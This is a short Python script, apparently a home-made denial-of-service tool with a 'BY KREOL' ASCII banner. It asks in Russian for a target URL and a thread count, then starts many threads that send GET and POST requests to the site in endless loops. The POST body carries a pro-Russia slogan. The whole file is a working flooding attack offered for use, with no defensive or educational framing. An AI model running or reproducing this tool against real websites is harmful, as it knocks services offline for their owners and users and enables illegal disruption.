import threading
import requests
i = 0
text = "/Glory&to&Russia&and&its&Russian&people/"
print('"\033[33m"')
print('██████╗░██╗░░░██╗  ██╗░░██╗██████╗░███████╗░█████╗░██╗░░░░░')
print('██╔══██╗╚██╗░██╔╝  ██║░██╔╝██╔══██╗██╔════╝██╔══██╗██║░░░░░')
print('██████╦╝░╚████╔╝░ █████═╝░██████╔╝█████╗░░██║░░██║██║░░░░░')
print('██╔══██╗░░╚██╔╝░░ ██╔═██╗░██╔══██╗██╔══╝░░██║░░██║██║░░░░░')
print('██████╦╝░░░██║░░░ ██║░╚██╗██║░░██║███████╗╚█████╔╝███████╗')
print('╚═════╝░░░░╚═╝░░░ ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░╚══════╝')
url = input('Введите ссылку на сайт: ')
countThread = input('Введите кол-во потоков: ')
def DDosGet():
  try:
   while True:
    r = requests.get(url)
    if(r.status_code == 200):
     requests.get(url, data=text)
     print("\033[32m"'GET запрос отправлен')
    else: print("\033[31m"'GET запрос не отправлен')
  except: print("\033[31m"'Возникла ошибка GET запроса')

def DDosPost():
  try:
   while True:
    r = requests.post(url, data=text)
    if(r.status_code == 200):
      requests.post(url)
      print("\033[36m"'POST запрос отправлен')
    else: print("\033[31m"'POST запрос не отправлен')
  except: print("\033[31m"'Возникла ошибка POST запроса')
   
while i <= int(countThread):
 threading.Thread(target=DDosGet).start()
 threading.Thread(target=DDosPost).start()
 i = i + 1